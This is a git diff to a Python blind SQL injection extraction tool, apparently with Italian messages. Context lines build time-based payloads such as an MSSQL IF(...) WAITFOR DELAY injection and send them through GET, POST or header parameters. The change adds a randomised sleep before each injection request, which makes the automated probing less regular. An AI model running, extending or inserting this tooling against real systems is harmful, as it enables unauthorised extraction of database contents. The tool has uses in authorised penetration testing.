@@ -8,6 +8,7 @@ PROJECT_ROOT = Path(__file__).resolve().parents[2]
 if str(PROJECT_ROOT) not in sys.path:
     sys.path.insert(0, str(PROJECT_ROOT))
 from utility.persistence import PersistenceUtility
+from random import randrange, random
 
 
 # TODO: implementare multi-threading per estrazione dei dati in parallelo (ad esempio mentre conta la lunghezza del nome altri thread cercano di estrarre i primi 3 caratteri e poi i restanti in parallelo) - lasciare sempre un thread libero
@@ -87,7 +88,6 @@ class BlindSQLIExtractorBase:
             if k in Settings.__dataclass_fields__:
                 return lambda default=None: self.get_setting(k, default)
         raise AttributeError(name)
-    
     def set_header_parameters(self, header: object):
         parameters = header.strip().split(":", 1)
         if len(parameters) != 2:
@@ -123,16 +123,7 @@ class BlindSQLIExtractorBase:
         self.settings.parameter_target = parameter
         self.save_data()
 
-    def add_header_parameters(self, header: object):
-        if not self.settings.header_parameters:
-            self.settings.header_parameters = header
-        else:
-            self.settings.header_parameters = {**self.settings.header_parameters, **header}
-
-    def is_really_time_based_injection(self):
-        return self.oracle("1=1")
-
-    def internal_check_target(self):
+    def _internal_check_target(self):
         if not self.settings.post_parameters and not self.settings.get_parameters and not self.settings.header_parameters:
             print(
                 "Errore: è necessario impostare almeno un target (funzione set_post_parameters(), set_get_parameters() o set_header_parameters()) per definire automaticamente il tipo di SQL Injection"
@@ -145,7 +136,6 @@ class BlindSQLIExtractorBase:
         if self.settings.verbose:
             print(f"\r\nEncoded query: {encoded_query}\r\n")
         return encoded_query
-
     def get_delayed_query(self, q):
         if "mssql" == self.settings.sql_type:
             query = f"';IF({q}) WAITFOR DELAY '0:0:{self.settings.delay}'--"
@@ -210,7 +200,7 @@ class BlindSQLIExtractorBase:
         return injected_header
 
     def oracle(self, q):
-        if not self.internal_check_target():
+        if not self._internal_check_target():
             return
         if not self.settings.sql_type:
             self.define_sql_type()
@@ -224,6 +214,7 @@ class BlindSQLIExtractorBase:
 
         for attempt in range(1, max_attempts + 1):
             try:
+                self.random_time_sleep(True)
                 start = time.monotonic()
                 if self.settings.post_parameters:
                     data = self.get_encoded_post_query(q)
@@ -338,8 +329,6 @@ class BlindSQLIExtractorBase:
         print("\r\n")
         return val
 
-    
-
     def use_saved_settings(self):
         try:
             merged_settings = self.persistence.merge_with_defaults(
@@ -357,7 +346,6 @@ class BlindSQLIExtractorBase:
         except Exception as e:
             print(f"Errore durante il ripristino delle impostazioni: {e}")
             return None
-        
     def use_extracted_data(self):
         try:
             extracted_payload = self.persistence.saved_data.get("extracted_data")
@@ -370,7 +358,6 @@ class BlindSQLIExtractorBase:
         except Exception as e:
             print(f"Errore durante il ripristino dei dati: {e}")
             return None
-
     def save_data(self):
         data_to_save = {
             "settings": self.persistence.to_serializable(self.settings),
@@ -380,3 +367,11 @@ class BlindSQLIExtractorBase:
             data_to_save,
             indent=4,
         )
+
+    def random_time_sleep(self, float=False):
+        if float:
+            r = random()
+        else:
+            r = randrange(0, 10, 1)
+        
+        time.sleep(r)
